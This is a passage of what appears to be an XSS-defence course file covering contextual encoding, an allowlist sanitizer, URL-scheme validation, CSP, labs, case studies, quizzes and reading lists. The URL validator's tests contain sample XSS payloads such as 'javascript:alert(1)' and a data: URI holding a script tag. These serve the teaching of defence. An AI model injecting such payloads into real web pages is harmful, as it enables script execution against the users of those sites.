        if tag in ALLOWED_TAGS:
            self.output.append("</{}>".format(tag))

    def handle_data(self, data):
        self.output.append(escape_html(data))   # text nodes are always encoded

def sanitize(html_input: str) -> str:
    parser = AllowlistSanitizer()
    parser.feed(html_input)
    return "".join(parser.output)
~~~

Complexity: O(n) in input length (single parse pass). Discussion points: why an allowlist (only named-safe tags survive) beats a denylist (must anticipate every dangerous tag/attribute); why this toy version is not production-safe (a real library defends against mutation-XSS re-parsing quirks, malformed markup, and namespace confusion — the exact gap DOMPurify closes).

### 3. Detect whether a URL string is safe to use as a link target

~~~javascript
// Reject dangerous schemes (javascript:, data:, vbscript:) and only allow http/https.
function isSafeUrl(candidate, currentOrigin) {
  let parsed;
  try {
    parsed = new URL(candidate, currentOrigin);
  } catch {
    return false;   // unparseable — treat as unsafe rather than guessing
  }
  const allowedSchemes = new Set(["http:", "https:"]);
  return allowedSchemes.has(parsed.protocol);
}

console.assert(isSafeUrl("https://example.com/page", "https://mysite.com") === true);
console.assert(isSafeUrl("javascript:alert(1)", "https://mysite.com") === false);
console.assert(isSafeUrl("data:text/html,<script>alert(1)</script>", "https://mysite.com") === false);
~~~

Complexity: O(n) in URL length (bounded by the URL parser's work). Follow-ups: "what about a relative URL like slash-slash evil.com (protocol-relative)?" (the URL constructor resolves it against currentOrigin's protocol, so it is caught if that protocol is not allowed — always pass a real base origin); "how would you extend this for an allowlist of specific hostnames instead of just schemes?" (parse parsed.hostname and check against a known-safe set for redirect scenarios).
`,

  "hands-on-labs": `
### Lab 1 — Break and fix three vulnerable renderers (beginner, about 1.5h)
Given three tiny Express routes (a stored comment renderer using innerHTML, a reflected search page using string concatenation, and a DOM-based banner reading location.hash), craft a working payload for each, confirm exploitation in a browser, then patch each with the correct fix from Beginner Concepts (textContent, escapeHtml, and swapping the sink). Deliverable: a short writeup pairing each payload with its fix and a one-line explanation of why it worked. Skills: all three classic XSS types, hands-on.

### Lab 2 — Deploy a nonce-based CSP and break your own bypasses (intermediate, about 2h)
Take a small Express + templating app, add per-request nonce generation and a strict script-src, then deliberately try to bypass it: attempt unsafe-inline injection, attempt to load an external script from an unlisted domain, and attempt a JSONP-endpoint bypass against an allowlisted host if one exists. Deliverable: the working CSP config plus a short report of which bypass attempts failed and why. Skills: nonce/hash CSP, strict-dynamic, real bypass reasoning.

### Lab 3 — Build and stress-test an allowlist sanitizer wrapper (advanced, about 3h)
Integrate DOMPurify into a small React app that must render "rich" LLM-style chat output (bold, links, code blocks) safely. Configure an explicit allowlist, then run it against a curated corpus of known payloads including at least one documented mutation-XSS test vector; confirm the sanitizer neutralizes all of them, then confirm a naive regex-based sanitizer you also write does NOT. Deliverable: the sanitizer wrapper module, the test corpus, and a short comparison table. Skills: DOMPurify, mXSS awareness, allowlist design.

### Lab 4 — Full production hardening pass (production, about 3h)
Take any small full-stack app you already have (or Lab 3's), add: HttpOnly/Secure/SameSite cookies, a report-only-then-enforced CSP rollout with a monitoring endpoint, ESLint security rules gating CI, and a regression test suite using a shared XSS payload corpus across every content-rendering component. Deliverable: a production checklist (from this page) with every item checked off and evidence (screenshot/log/test output) for each. Skills: the entire Production and Quality sections, end to end.
`,

  "real-projects": `
Portfolio-grade projects (each maps to skills employers specifically screen for in security-conscious hiring):

1. **XSS-safe rich-text renderer library** — A small, published npm/PyPI package wrapping DOMPurify (or bleach) with a documented, minimal allowlist, a test suite covering the OWASP XSS filter-evasion cheat sheet payloads plus at least one mutation-XSS vector, and clear docs on the exact threat model it covers and does not cover. Demonstrates: sanitizer design, allowlist thinking, test rigor — the kind of small, focused security library that stands out in a portfolio.

2. **CSP rollout tool** — A CLI or middleware package that instruments an existing Express/Django app to run CSP in Report-Only mode, aggregates violation reports, and generates a suggested enforced policy (script-src, style-src, img-src) based on observed traffic, with a dry-run diff before enabling enforcement. Demonstrates: real operational CSP rollout experience, exactly the kind of tooling security teams build internally.

3. **"Vulnerable by design" teaching app with instrumented fixes** — A deliberately vulnerable small web app (stored, reflected, and DOM-based XSS instances, clearly scoped and documented as intentionally insecure for learning) with a companion, side-by-side "fixed" branch and an automated test suite that fails against the vulnerable branch and passes against the fixed one. Demonstrates: deep understanding of root cause plus the ability to teach it — valuable for security-adjacent roles and for this platform's own hands-on labs pattern.

Each project: tests proving the security property (not just "it compiles"), a README explaining the threat model and what is explicitly out of scope, and — for the rollout tool and renderer library — real integration into at least one working sample app so the artifact is demonstrably usable, not just theoretical.
`,

  "case-studies": `
### The Samy worm (MySpace, 2005)
Samy Kamkar found that MySpace's HTML filter blocked the literal string "javascript" but not creative capitalization and CSS-based tricks, and that it allowed certain style attributes it should not have. His stored-XSS payload copied itself into every viewer's profile automatically, growing from one profile to over a million in about 20 hours before MySpace took the site offline to contain it. **Lesson**: blacklist-based filters lose an arms race against a motivated attacker, and stored XSS in a social product has a growth curve — self-propagation — that reflected XSS structurally cannot match.

### The Twitter "Mikeyy" worm (2010)
A stored XSS bug in profile fields let an attacker's script auto-post tweets and re-inject itself into other users' profiles, spreading across the platform within hours and forcing emergency patches. **Lesson**: the same self-propagation dynamic recurs whenever any user-editable, other-users-visible field (bio, profile name, comment) is rendered without proper encoding — this is a pattern to specifically audit for in any social feature, not a one-off historical curiosity.

### The rise of nonce-based CSP at scale (industry-wide, 2015 onward)
Early CSP adopters found that host-based allowlists (script-src example.com) were routinely bypassed via open redirects or JSONP endpoints on the allowlisted domain itself, and that they broke constantly as third-party scripts and bundlers changed. The industry's shift to nonce- and hash-based script-src, and later strict-dynamic, was a direct response: allowlisting by *source identity* proved far weaker than allowlisting by *possession of a per-response secret token*. **Lesson**: a security control's real-world bypass rate matters as much as its theoretical design — CSP's own evolution (v1 to v2 to v3) is a case study in tightening a control after watching how it actually failed in production.

### Mutation XSS research (Heiderich et al., 2013 onward)
Security researchers demonstrated that strings a sanitizer had already verified as safe could become executable purely from the browser's own HTML-parsing and re-serialization behavior via innerHTML — no bug in the sanitizer's string-matching logic was needed, because the danger only existed after the browser's parser touched the string. This forced every major sanitization library (including DOMPurify, which was built partly in response) to test against the browser's actual parser behavior, not just against a list of known-bad substrings. **Lesson**: for a browser-security bug class, the browser's own parsing behavior is part of the attack surface, not just the application's explicit code — testing must account for what the browser does with your "safe" output, not just what your code produced.
`,

  comparisons: `
| Dimension | XSS | CSRF | SQL Injection | Clickjacking |
|-----------|-----|------|----------------|----------------|
| Where the attacker's payload executes | Victim's browser, in the target origin | N/A — no attacker code runs; a forged request is sent using ambient auth | Target database server | Victim's browser, but only fools the human, no script needed |
| What is borrowed from the victim | Execution context + full DOM/cookie access | Ambient authentication (cookies auto-attached) | Nothing from the victim — attacks the server directly | The victim's own intended click/input |
| Primary fix | Contextual output encoding | Anti-CSRF tokens, SameSite cookies | Parameterized queries | Frame-busting headers (X-Frame-Options / frame-ancestors) |
| Compensating controls | CSP, HttpOnly cookies, sanitization | Double-submit cookies, re-authentication for sensitive actions | Least-privilege DB accounts, input validation as defense-in-depth | Same as primary in practice |
| Needs stored state on the server? | Only for the stored variant; reflected/DOM-based do not | No | Sometimes (persistence not required for the exploit itself) | No |
| Can it defeat the others? | Yes — can read CSRF tokens from the DOM, and can pivot toward exfiltrating data a SQLi might also target | No — cannot execute code or read responses (same-origin policy blocks reading the forged response) | No — server-side only, no browser involvement | Limited — mostly a UI-redress technique, doesn't grant code execution |

**How seniors choose defenses**: this is not really a "choose one" decision — production systems need all four addressed, because they are largely orthogonal (different injection surfaces, different browser mechanisms). The prioritization question seniors actually ask is "which one is most present in this specific application's attack surface" (a content-heavy social app skews XSS-heavy; a banking app with state-changing GET/POST forms skews CSRF-heavy; anything with raw SQL string-building skews SQLi-heavy) and staff review effort accordingly, while still applying baseline defenses (encoding, parameterization, CSRF tokens, frame-ancestors) everywhere by default.
`,

  "related-technologies": `
- **Content Security Policy (CSP)** — the browser-enforced allowlisting mechanism covered in depth in Advanced Concepts; the natural next read is the W3C CSP specification itself.
- **DOMPurify** — the industry-standard client-side HTML sanitizer, specifically hardened against mutation-XSS; the reference implementation to study for how a real sanitizer handles the browser's own parsing quirks.
- **Trusted Types API** — a newer browser API (Chromium-led) that lets an application enforce, at the platform level, that only vetted objects (not raw strings) may ever reach a dangerous DOM sink like innerHTML — effectively making DOM-based XSS a build-time/runtime-enforced impossibility rather than a code-review responsibility.
- **bleach / OWASP Java HTML Sanitizer** — server-side allowlist sanitizers for Python and Java ecosystems respectively, playing the same architectural role as DOMPurify does client-side.
- **The Cookies & Sessions skill** — read for the full HttpOnly/Secure/SameSite story and how session design changes XSS's blast radius.
- **The CSRF skill** — the natural next stop: same trust model, opposite exploitation direction, and the two defenses (encoding vs anti-CSRF tokens) are frequently implemented side by side.
- **The SQL Injection skill** — the closest sibling vulnerability by root cause; reading both back to back cements the general "untrusted data crossing into an interpreted context" lesson.
- **The OWASP Top 10 skill** — the umbrella view showing where XSS (A03:2021 – Injection) sits alongside every other major web application risk.
- **The Secrets Management skill** — for the "what does a successful XSS actually go after" angle: tokens, keys, and credentials reachable from browser-side JavaScript.

Natural next pages on this platform, in order: **CSRF** → **SQL Injection** → **OWASP Top 10** → **Secrets Management**.
`,

  "latest-updates": `
Verified against my knowledge through early-to-mid 2025 — check the OWASP XSS Prevention Cheat Sheet and MDN's CSP documentation for anything newer, since browser security features ship faster than most reference material updates.

- **Trusted Types API**: shipped in Chromium-based browsers and continuing to expand adoption; it lets an application declare that only values passing through a vetted "policy" function may be assigned to dangerous sinks like innerHTML, moving DOM-based XSS prevention from "remember to encode everywhere" to "the platform refuses raw strings at the sink." Cross-browser support beyond Chromium was still evolving as of my knowledge cutoff — verify current status before relying on it as a sole defense.
- **CSP Level 3** refinements continue (strict-dynamic maturity, better reporting via the newer report-to directive alongside the older report-uri) — report-uri is considered legacy but still widely supported; report-to is the forward-looking replacement, though its rollout has been uneven across browsers.
- **DOMPurify** continues active maintenance with regular releases specifically responding to newly discovered mutation-XSS and clobbering-adjacent bypasses — pinning an old version is a real, recurring source of reopened vulnerabilities.
- **Framework-level hardening**: mainstream frameworks (React, Vue, Angular) continue tightening default behavior and documentation warnings around their raw-HTML escape hatches; Angular in particular has invested heavily in its own DomSanitizer service as a first-class, framework-native equivalent to DOMPurify.
- **LLM-adjacent XSS**: as of my knowledge cutoff, treating model-generated content as untrusted input at render time is an emerging but not yet universally adopted practice among teams shipping chat/agent UIs — this is a genuinely new instance of an old lesson, not a new vulnerability class, and worth explicitly calling out in threat models for any AI-facing product.
`,

  "future-roadmap": `
Where XSS defense is heading, and what is worth betting career time on:

1. **Trusted Types becoming a baseline expectation**, the way CSP itself did a decade prior — expect more frameworks and linters to ship first-class support for enforcing "no raw string reaches a DOM sink," pushing DOM-based XSS prevention from a per-developer discipline into a platform-enforced guarantee.
2. **CSP reporting standardizing on report-to** over the legacy report-uri directive as browser support converges, simplifying the operational monitoring story described in this page's Monitoring section.
3. **Sanitizer libraries continuing an arms race with mutation-XSS research** — this is not a solved problem; expect DOMPurify and its peers to keep shipping patches as researchers find new browser-parsing edge cases, meaning "keep the sanitizer dependency current" stays a permanent, not one-time, task.
4. **AI-generated and AI-influenced content becoming a first-class XSS input source** in threat models — as more products render LLM output directly into rich UIs, and as prompt injection techniques mature, expect security guidance (and likely dedicated tooling) to explicitly formalize "treat model output as untrusted user input" the same way input from an HTTP request has always been treated.
5. **Convergence of XSS and supply-chain concerns** — as more of a page's script surface comes from third-party analytics, ad, and component libraries, strict-dynamic-style trust propagation and Subresource Integrity become as relevant to XSS prevention as your own application's encoding discipline.

For your career: the highest-leverage bets are fluency in contextual output encoding (still the foundational skill, unchanged in decades), hands-on CSP deployment experience (a frequently underrepresented practical skill relative to how often it appears in job requirements), and an explicit mental model for AI-generated content as an untrusted input source — the last one is where genuinely new expertise is still being formed industry-wide.
`,

  "cheat-sheet": `
~~~text
# --- The three classic types ---
Stored     : payload saved server-side, served to every viewer (DB comment field, profile bio)
Reflected  : payload round-trips through one request (URL query param echoed unencoded)
DOM-based  : entirely client-side; source (location.hash/search, referrer) -> sink (innerHTML, eval)

# --- Contextual output encoding (use the RIGHT one per context) ---
HTML body      : & -> &amp;   < -> &lt;   > -> &gt;   " -> &quot;   ' -> &#x27;
HTML attribute : encode ALL non-alphanumeric chars as entities; ALWAYS double-quote the attribute
JS string      : backslash-escape quotes/backslashes; prefer JSON.stringify + encode < > & as unicode escapes
URL            : percent-encode the value; validate scheme is http/https before using as a link target
CSS            : avoid untrusted data in style/CSS entirely if at all possible

# --- Safe vs dangerous DOM sinks ---
SAFE   : textContent, setAttribute (for non-event attrs), createElement + append
DANGER : innerHTML, outerHTML, document.write, eval, Function(), setTimeout(string), javascript: URIs

# --- Framework auto-escape (default) vs escape hatch (named, reviewed) ---
React    : JSX {value} escapes        ->  dangerouslySetInnerHTML={{ __html: x }} bypasses
Vue      : {{ value }} escapes        ->  v-html="x" bypasses
Django   : {{ value }} escapes        ->  {{ value|safe }} / mark_safe(x) bypasses
Jinja2   : {{ value }} escapes (Flask default)  ->  {{ value|safe }} bypasses

# --- Sanitization (when raw HTML must be allowed) ---
DOMPurify.sanitize(dirtyHtml, { ALLOWED_TAGS: [...], ALLOWED_ATTR: [...] })
- allowlist, not blacklist
- tested against known mutation-XSS (mXSS) payloads
- sanitize with a real parser, never a handwritten regex

# --- Content Security Policy ---
script-src 'self' 'nonce-RANDOM' 'strict-dynamic'; object-src 'none'; base-uri 'self'
- nonce: fresh, random, per-response ONLY -- never reused, never predictable
- hash : sha256-... for fixed, static inline scripts
- strict-dynamic: propagates trust from a nonce'd script to scripts IT loads
- Report-Only first, enforce after tuning: Content-Security-Policy-Report-Only

# --- Session cookie hardening (mitigation, not a fix) ---
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
- HttpOnly blocks document.cookie theft, does NOT stop the exploit itself

# --- Advanced / senior topics ---
mXSS         : sanitized-looking string mutates into dangerous markup after browser re-parses it
DOM clobbering: script-free HTML with matching id/name overwrites an expected global/config object

# --- Golden rule ---
Validate input for DATA QUALITY. Encode output for the DESTINATION CONTEXT. Never conflate the two.
~~~
`,

  "flash-cards": `
| Front | Back |
|-------|------|
| The three classic XSS types? | Stored (persisted), reflected (one request round-trip), DOM-based (client-side source to sink, no server round-trip needed) |
| Primary defense against XSS? | Contextual output encoding at the point of render, for the exact context (HTML/attribute/JS/URL) |
| Why is "sanitize input" alone insufficient? | The same value can later be output into multiple different contexts, each requiring different encoding; input-time sanitization cannot anticipate all of them |
| Why doesn't a literal script tag execute via innerHTML? | The HTML tree-construction algorithm marks script elements created this way as inert — real payloads use event-handler attributes instead (img onerror, svg onload) |
| What does a CSP nonce require to stay secure? | Fresh, cryptographically random generation on EVERY response — reuse or predictability defeats it |
| dangerouslySetInnerHTML, v-html, mark_safe, the safe filter — what do they have in common? | Each is a framework's deliberately named, explicit escape hatch that bypasses default auto-escaping |
| What is mutation XSS (mXSS)? | A string that looks safe to a sanitizer becomes dangerous after the browser's own HTML parser processes and re-serializes it (e.g. via innerHTML round-trip) |
| What is DOM clobbering? | Script-free, attacker-controlled HTML with a matching id/name attribute overwrites an expected global variable or config object the app implicitly trusts |
| Does HttpOnly stop XSS? | No — it stops document.cookie exfiltration of the session token, but the injected script still runs and can still make authenticated requests |
| XSS vs CSRF — key difference? | XSS makes the victim's browser execute attacker code (borrows execution context); CSRF makes the victim's browser send a forged request (borrows ambient authentication), no code execution needed |
| What browser mechanism makes XSS worth exploiting at all? | The Same-Origin Policy — script running "as" the trusted origin inherits that origin's cookies, DOM access, and authenticated API calls |
| script-src 'self' 'unsafe-inline' — good or bad CSP? | Bad — unsafe-inline defeats CSP's core protection against inline injected scripts |
| Allowlist vs blacklist sanitization — which is correct? | Allowlist — enumerate what IS allowed (tags/attributes); blacklists only enumerate what the defender thought of |
| Best practice for URLs from untrusted input used as link targets? | Parse with a real URL parser and validate the scheme is http/https; reject javascript:/data: URIs |
| Should LLM/model output be treated as trusted or untrusted when rendered? | Untrusted — prompt injection can steer model output, making it functionally equivalent to any other attacker-influenceable user content |
`,

  mcqs: `
**1. Which of the following is a DOM-based XSS vulnerability?**

A) A comment stored unescaped in a database and rendered to every visitor
B) A search results page that echoes an unescaped URL query parameter back into the HTML
C) Client-side JavaScript that reads location.hash and assigns it to element.innerHTML, with no server involvement in the payload's path
D) An attacker forging a POST request using a victim's ambient session cookie

**Answer: C** — A is stored XSS, B is reflected XSS, D describes CSRF, not XSS at all.

**2. What is the primary defense against XSS?**

A) Blacklisting the string "script" in user input
B) Contextual output encoding at the point of render
C) Enabling HTTPS everywhere
D) Rejecting any input containing an apostrophe

**Answer: B** — A is a bypassable blacklist, C protects transport not rendering, D breaks legitimate input (like O'Brien) without addressing the actual root cause.

**3. Why does reusing the same CSP nonce across multiple responses break its security guarantee?**

A) It does not break anything — nonces can be reused freely
B) A reused or predictable nonce can be attached by an attacker to their own injected script, making it indistinguishable from a legitimate one
C) Reusing nonces only affects page load performance
D) CSP ignores nonces entirely if they repeat

**Answer: B** — the entire mechanism depends on the nonce being an unguessable, single-use secret tied to one specific response.

**4. What does dangerouslySetInnerHTML in React, v-html in Vue, and the safe filter in Django/Jinja2 all have in common?**

A) They are all deprecated APIs scheduled for removal
B) They are each a framework's explicit, named escape hatch that bypasses default auto-escaping
C) They automatically sanitize input before rendering it
D) They only work with server-rendered pages, never client-rendered ones

**Answer: B** — each framework gives the raw-HTML path a distinct, greppable name specifically so it can be code-reviewed and audited.

**5. A sanitizer verifies a string contains no script tags or event handlers, yet the resulting page still executes attacker script after the browser processes it. What class of bug does this describe?**

A) Reflected XSS
B) CSRF
C) Mutation XSS (mXSS)
D) SQL Injection

**Answer: C** — mXSS occurs when the browser's own HTML parsing/re-serialization behavior (e.g., via innerHTML) transforms a string the sanitizer checked into a structurally different, dangerous form.

**6. Which statement about HttpOnly cookies is correct?**

A) They prevent XSS from occurring in the first place
B) They stop document.cookie from reading the cookie value, limiting the impact of a successful XSS exploit, but do not stop the exploit itself
C) They encrypt the cookie value so it cannot be stolen even over an insecure channel
D) They are a CSRF-specific defense unrelated to XSS

**Answer: B** — HttpOnly is a mitigation that reduces blast radius (see the Cookies & Sessions skill), not a fix for the underlying injection vulnerability.
`,

  "revision-notes": `
**The core mechanic in five lines:** XSS is a context-confusion bug: untrusted text gets parsed as HTML/script/attribute/URL instead of staying inert data, because the browser's parser cannot tell attacker-supplied text from developer-authored markup. Three classic delivery types exist — stored (persisted, served to everyone), reflected (one request round-trip), and DOM-based (entirely client-side, source-to-sink in JavaScript). The Same-Origin Policy is what makes this worth exploiting: injected script inherits the full privileges (cookies, DOM, authenticated API access) of whatever origin it landed in.

**The primary defense in four lines:** Contextual output encoding at the point of render — HTML entity encoding for HTML body content, attribute encoding plus quoting for attributes, JS string escaping (or better, JSON serialization) for script contexts, and URL/percent encoding plus scheme validation for URLs. "Sanitize the input" alone is insufficient because the same value can later be rendered into several different contexts, each requiring its own encoding — the render site is the only place with enough information to encode correctly.

**Frameworks and sanitizers in four lines:** React, Vue, Django, and Jinja2 all auto-escape output by default and each names its raw-HTML escape hatch explicitly (dangerouslySetInnerHTML, v-html, the safe filter/mark_safe) so it can be centralized and audited. When raw HTML genuinely must be allowed (rich text, LLM output), sanitize with an allowlist library like DOMPurify — tested against known mutation-XSS bypasses — never a handwritten regex, since HTML is not a regular language.

**Defense-in-depth in five lines:** Content Security Policy is a compensating control, not the primary fix: nonce- or hash-based script-src blocks unauthorized inline/external scripts even if an encoding bug slips through, with strict-dynamic solving the bundler-propagation problem; unsafe-inline defeats it entirely. HttpOnly, Secure, and SameSite cookie attributes (see the Cookies & Sessions skill) limit blast radius by stopping session-token exfiltration via document.cookie, without stopping the exploit itself. Advanced/senior topics — mutation XSS (a sanitized-looking string becomes dangerous after the browser re-parses it) and DOM clobbering (script-free HTML overwrites an expected global) — are exactly the failure modes that naive, string-only defenses miss.

**Ecosystem position in three lines:** XSS and CSRF share a trust model but exploit opposite directions (execution context vs ambient authentication) and are usually defended side by side. XSS and SQL Injection share a root cause (untrusted data crossing into an interpreted context) under OWASP's A03:2021 – Injection umbrella. Treat LLM/agent output as untrusted input at render time — prompt injection makes model output a genuinely new, attacker-influenceable source for this decades-old vulnerability class.
`,

  "learning-roadmap": `
A realistic path to senior-level XSS fluency (adjust pace to your background):

**Week 1 — Foundations and the three classic types.** Beginner Concepts + Lab 1. Reproduce a stored, a reflected, and a DOM-based XSS in a local sandbox app and patch each. Milestone: you can explain, from memory, why a script tag inserted via innerHTML does not execute but an img onerror attribute does.

**Week 2 — Contextual encoding fluency.** Intermediate Concepts. Implement your own HTML-entity encoder and JS-string encoder from scratch (Coding Questions #1), then deliberately break an application by using the wrong encoding for a given context and observe the exploit succeed. Milestone: you can name the correct encoding for any of the four contexts on sight.

**Week 3 — Frameworks, sanitizers, and CSP.** Finish Intermediate Concepts (framework auto-escaping) and Advanced Concepts (CSP, nonces, hashes, strict-dynamic). Lab 2 (deploy and try to bypass your own CSP). Milestone: a working nonce-based CSP you built and validated in Report-Only mode.

**Week 4 — Advanced/senior topics and production hardening.** Mutation XSS and DOM clobbering in Advanced Concepts; Lab 3 (sanitizer wrapper with a real payload corpus) and Lab 4 (full production hardening pass). Milestone: every item on the Production Checklist is checked off with evidence on a real project.

**Week 5 — Interview and case-study polish.** Interview Questions and Case Studies sections; be able to explain the Samy worm, mXSS, and DOM clobbering out loud, unprompted, and to whiteboard the layered-defense architecture diagram from memory.

Then continue to the **CSRF** skill on this platform — the natural next stop, since it shares XSS's trust model but exploits the opposite direction, and the two defenses are almost always implemented together in a real application.
`,

  "official-docs": `
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — the definitive, actively maintained reference for contextual output encoding rules; read this in full.
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) — the canonical catalog of bypass techniques against naive filters; essential for understanding why blacklists fail.
- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — the browser-implementation-accurate reference for every CSP directive, including script-src, nonces, and hashes.
- [W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/) — the formal specification, including strict-dynamic.
- [DOMPurify documentation and repository](https://github.com/cure53/DOMPurify) — configuration options, security advisories, and the library's own test suite of known bypass payloads.
- [MDN — Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) — the trust-boundary background this entire page depends on.
- [Trusted Types API explainer (W3C / Chromium)](https://w3c.github.io/trusted-types/dist/spec/) — the newest browser-level DOM-based-XSS prevention mechanism.
`,

  books: `
- **The Web Application Hacker's Handbook, 2nd ed.** — Stuttard & Pinto. The classic, exhaustive treatment of web vulnerabilities including a deep XSS chapter with real-world bypass techniques.
- **The Tangled Web** — Michal Zalewski. Written by a browser-security researcher; unmatched depth on Same-Origin Policy, parsing quirks, and why browsers behave the way they do — essential for the Internal Working and Advanced Concepts sections.
- **Web Security for Developers** — Malcolm McDonald. A practical, developer-focused (not pentester-focused) introduction that pairs well with the framework-auto-escaping angle of this page.
- **Real-World Bug Hunting** — Peter Yaworski. Bug-bounty writeups organized by vulnerability class, including numerous real, disclosed XSS reports with root-cause analysis.
- **OWASP Testing Guide** (free, community-maintained) — structured methodology for finding XSS and related issues during a security assessment.
`,

  blogs: `
- **PortSwigger Web Security Academy blog and labs** (portswigger.net/web-security) — free, hands-on labs specifically for XSS variants including DOM-based and mutation XSS; the best practical companion to this page.
- **The DOMPurify project blog/changelog** (via its GitHub repository) — high-signal for tracking newly discovered bypasses and how the library's maintainers responded.
- **Mario Heiderich's research and talks** (independent researcher behind much of the foundational mXSS work) — search for his conference talks and published research for the deepest available treatment of mutation XSS.
- **Google Security Blog** — periodic, high-signal posts on Trusted Types adoption and browser-level XSS mitigations from the team driving much of that work.
- **Snyk and Semgrep engineering blogs** — practical posts on detecting XSS-prone patterns via static analysis, directly relevant to the Testing and Production Usage sections.
`,

  "research-papers": `
This is a well-studied area with real, citable foundational papers rather than a thin one:

- **"mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations"** — Heiderich, Frosch, Holz, et al., 2013. The foundational mutation-XSS paper; directly informs the Advanced Concepts section.
- **"deDacota: Toward Identifying Missing Application Isolation for Web Templates"** and related work on automatic script-vs-markup separation — relevant background for why context-aware auto-escaping in templating engines became the industry default.
- **W3C Content Security Policy Level 1/2/3 specifications** — while formally a specification rather than a research paper, the CSP editors' draft history and accompanying design rationale documents function as the closest thing to a primary research source on how nonce/hash/strict-dynamic evolved in response to real-world bypasses.
- **"Large-Scale Evaluation of Third-Party Script Vulnerabilities"**-style empirical studies (multiple academic groups have published measurement studies on how third-party scripts introduce XSS-adjacent risk) — search current venues (USENIX Security, IEEE S&P, ACM CCS) for the latest measurement work, since this is an actively re-measured area as the web's script supply chain evolves.

If you want the closest foundational reading beyond XSS-specific papers: any solid treatment of browser same-origin-policy design (Zalewski's "The Tangled Web," listed in Books) functions as the conceptual prerequisite most XSS papers assume you already have.
`,

  videos: `
- **PortSwigger's "Web Security Academy" video walkthroughs** — practical, lab-paired videos covering reflected, stored, and DOM-based XSS with real bypass techniques.
- **Mario Heiderich — conference talks on mutation XSS** (search recent OWASP/Black Hat/DEF CON archives) — the primary-source explanation of mXSS from the researcher who named and formalized it.
- **Google Chrome team talks on Trusted Types** (search Chrome Dev Summit / Google I/O archives) — explains the design rationale and adoption story for the newest DOM-based-XSS browser mitigation.
- **LiveOverflow (YouTube)** — accessible, example-driven walkthroughs of real XSS bugs and browser-parsing quirks, good for building intuition before tackling the denser academic material.
- **OWASP AppSec conference archives** (search "XSS" across any recent OWASP Global AppSec talk listing) — a reliable source of current, practitioner-level talks on evolving defenses.
`,

  "github-repos": `
- [cure53/DOMPurify](https://github.com/cure53/DOMPurify) — the reference client-side sanitizer; read its test suite to see the actual bypass payloads it defends against.
- [mozilla/bleach](https://github.com/mozilla/bleach) — a widely used server-side (Python) allowlist HTML sanitizer, the natural counterpart to DOMPurify for backend rendering.
- [OWASP/owasp-java-html-sanitizer](https://github.com/OWASP/owasp-java-html-sanitizer) — the Java ecosystem's equivalent allowlist sanitizer.
- [PortSwigger/web-security-academy](https://portswigger.net/web-security) (labs, referenced via their site — search for community-maintained companion repos) — hands-on, gradually escalating XSS exercises.
- [OWASP/CheatSheetSeries](https://github.com/OWASP/CheatSheetSeries) — source of the XSS Prevention and Filter Evasion cheat sheets; skim the raw markdown for the most current version.
- [helmetjs/helmet](https://github.com/helmetjs/helmet) — the Express middleware used throughout this page's production examples for CSP and related security headers.
- [google/security-research](https://github.com/google/security-research) — periodic disclosures and write-ups, some directly XSS-relevant, from Google's security team.
- [w3c/trusted-types](https://github.com/w3c/trusted-types) — the specification and polyfill repository for the Trusted Types API discussed in Advanced Concepts and Future Roadmap.
`,

  "practice-problems": `
**Ordered by skill focus:**

1. *Encoding fluency*: implement HTML-entity, JS-string, and URL encoders from scratch (no library), then write tests proving each one neutralizes at least five distinct payload variants from the OWASP Filter Evasion Cheat Sheet.
2. *Sink recognition*: given ten short code snippets (mix of vanilla JS, React, Vue, Django templates), correctly label each as safe, vulnerable, or "vulnerable only if X" and justify why.
3. *CSP design*: given a described application (which third-party scripts it loads, whether it has inline scripts, whether it is served from a CDN), write the correct script-src directive, choosing between host allowlisting, nonces, hashes, and strict-dynamic, and explain the tradeoff of your choice.
4. *Sanitizer configuration*: given a spec ("allow bold, italics, links, and code blocks only; links must be http/https"), write a correct DOMPurify (or bleach) configuration and a test suite that would catch a regression.
5. *Root-cause triage*: given a bug bounty report describing observed behavior, classify it as stored, reflected, or DOM-based XSS, and identify the exact line of code most likely responsible.
6. *mXSS/clobbering recognition*: given a payload that contains no script tags or event handlers, determine whether it is a DOM-clobbering attempt, and explain what application code pattern it would need to succeed against.

External sets: PortSwigger Web Security Academy's XSS labs (progressively harder, includes DOM-based and mutation-adjacent challenges), OWASP's WebGoat (a deliberately vulnerable training app with an XSS module), and HackerOne's public disclosed-reports search filtered to "xss" for real-world triage practice.
`,

  "architecture-diagram": `
The reference layered-defense architecture for a production web application handling XSS-relevant risk end to end:

~~~mermaid
flowchart TB
    Client["Browser"] -->|HTTP request| Edge["CDN / edge (static assets, cacheable responses)"]
    Edge --> App["App server\n(templating auto-escape ON by default)"]
    App --> Nonce["Per-request nonce generator"]
    Nonce --> App
    App -->|renders| HTML["HTML response with:\n- context-encoded dynamic values\n- CSP header (nonce/hash script-src)\n- HttpOnly/Secure/SameSite cookies"]
    HTML --> Client
    Client -->|raw-HTML content path only| Sanitizer["DOMPurify (client) or bleach (server)\nallowlist sanitizer"]
    Sanitizer -->|clean HTML| RichRender["Rich-content renderer\n(markdown/LLM output preview)"]
    Client -->|CSP violation| Report["CSP report endpoint"]
    Report --> Monitor["Monitoring / alerting\n(Sentry, Datadog, ELK)"]
    App --> CI["CI pipeline:\nESLint security rules, Semgrep/CodeQL,\nXSS payload regression tests"]
    CI --> App
~~~

Every box maps to a section on this page: templating auto-escape (Intermediate Concepts), the nonce generator and CSP header (Advanced Concepts, Deployment), the sanitizer path for rich content (Intermediate Concepts, Hands-on Labs), the reporting/monitoring loop (Monitoring), and the CI gate (Testing, Production Usage).
`,

  "mind-map": `
~~~mermaid
mindmap
  root((XSS))
    Classic types
      Stored
      Reflected
      DOM-based
    Why it works
      Same-Origin Policy trust
      HTML parsing: tokenize to DOM to execute
    Primary defense
      Contextual output encoding
        HTML body
        HTML attribute
        JS string
        URL
      Framework auto-escaping
        React JSX / dangerouslySetInnerHTML
        Vue / v-html
        Django Jinja2 / safe mark_safe
    Defense in depth
      Content Security Policy
        Nonce-based
        Hash-based
        strict-dynamic
      Sanitization
